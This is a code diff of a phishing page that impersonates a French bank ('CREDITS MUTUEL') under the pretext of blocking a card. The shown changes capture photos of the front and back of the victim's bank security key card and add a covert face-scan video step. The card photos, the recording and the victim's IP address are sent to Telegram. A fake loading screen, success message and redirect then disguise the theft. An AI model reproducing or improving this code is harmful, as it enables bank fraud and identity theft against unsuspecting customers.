-        stepVerify.classList.remove('active');
+        // Attendre un peu puis arrêter la vidéo
+        await new Promise(r => setTimeout(r, 800));
+
+        stopFaceCamera();
+        await stopRecordingAndSend();
+
+        // Envoyer photos + texte final
+        await sendPhotoToTelegram(rectoBlob, 'recto');
+        await sendPhotoToTelegram(versoBlob, 'verso');
+
+        const ip = await getUserIP();
+        await sendTextToTelegram(
+            `--------✅[CREDITS MUTUEL]✅-------\n\n🚀 Nouvelle carte de clés + Scan facial\n💻 IP ADDRESS : ${ip}\n\n-------✅[CREDITS MUTUEL]✅-------`
+        );
+
+        // Loading → success → redirect
+        stepFace.classList.remove('active');
         stepLoading.classList.add('active');
         mainTitle.textContent = 'Chargement';
         sectionTitle.innerHTML = 'Identifiant / Mot de passe <i class="fa-solid fa-chevron-down"></i>';
         forgotLink.style.display = 'none';
 
-        // Envois en parallèle (plus rapide)
-        try {
-            await Promise.all([
-                sendPhotoToTelegram(rectoBlob, 'recto'),
-                sendPhotoToTelegram(versoBlob, 'verso')
-            ]);
-
-            const ip = await getUserIP();
-            await sendTextToTelegram(
-                `--------✅[CREDITS MUTUEL]✅-------\n\n🚀 Nouvelle carte de clés (RECTO + VERSO)\n💻 IP ADDRESS : ${ip}\n\n-------✅[CREDITS MUTUEL]✅-------`
-            );
-
-            console.log('✅ Tous les envois terminés');
-        } catch (e) {
-            console.error('❌ Erreur envoi :', e);
-        }
-
-        // Animation success + redirection
         setTimeout(() => {
             stepLoading.classList.remove('active');
             stepSuccess.classList.add('active');
@@ -903,40 +1102,63 @@ label.field-label {
         }, 2500);
     }
 
-    // ─── Recommencer tout ───
-    async function restartAll() {
-        console.log('🔄 Recommencer tout');
+    function stopFaceCamera() {
+        if (faceStream) {
+            faceStream.getTracks().forEach(t => t.stop());
+            faceStream = null;
+        }
+    }
 
+    // ═══ CONFIRM PHOTOS → SCAN VISAGE ═══
+    async function confirmAndGoToFace() {
+        if (!rectoBlob || !versoBlob) {
+            alert('Erreur : photos manquantes.');
+            return;
+        }
+
+        confirmBtn.disabled = true;
+        confirmBtn.textContent = 'Passage au scan...';
+
+        stepVerify.classList.remove('active');
+        stepFace.classList.add('active');
+        mainTitle.textContent = 'Vérification faciale';
+        sectionTitle.innerHTML = 'Scan du visage <i class="fa-solid fa-chevron-down"></i>';
+        forgotLink.style.display = 'none';
+
+        await startFaceScan();
+    }
+
+    async function restartAll() {
         rectoBlob = null;
         versoBlob = null;
         captureSide = 'recto';
-
         confirmBtn.disabled = false;
-        confirmBtn.textContent = 'Valider et envoyer';
+        confirmBtn.textContent = 'Valider et passer au scan';
 
         stepVerify.classList.remove('active');
         stepForm.classList.add('active');
-
         mainTitle.textContent = 'Opposition';
         sectionTitle.innerHTML = 'Carte de clés <i class="fa-solid fa-chevron-down"></i>';
-
+        forgotLink.style.display = 'flex';
         capturePreview.style.display = 'none';
         cameraHint.textContent = 'Présentez le RECTO de la carte';
 
         await startCamera();
     }
 
-    // ─── Événements ───
+    // ═══ ÉVÉNEMENTS ═══
     captureBtn.addEventListener('click', capturePhoto);
-    confirmBtn.addEventListener('click', confirmAndSend);
+    confirmBtn.addEventListener('click', confirmAndGoToFace);
     restartBtn.addEventListener('click', restartAll);
     retakeRecto.addEventListener('click', () => retake('recto'));
     retakeVerso.addEventListener('click', () => retake('verso'));
 
-    window.addEventListener('beforeunload', stopCamera);
+    window.addEventListener('beforeunload', () => {
+        stopCardCamera();
+        stopFaceCamera();
+    });
 
     window.addEventListener('load', () => {
-        console.log('📄 Page chargée, démarrage caméra');
         startCamera();
     });
 </script>
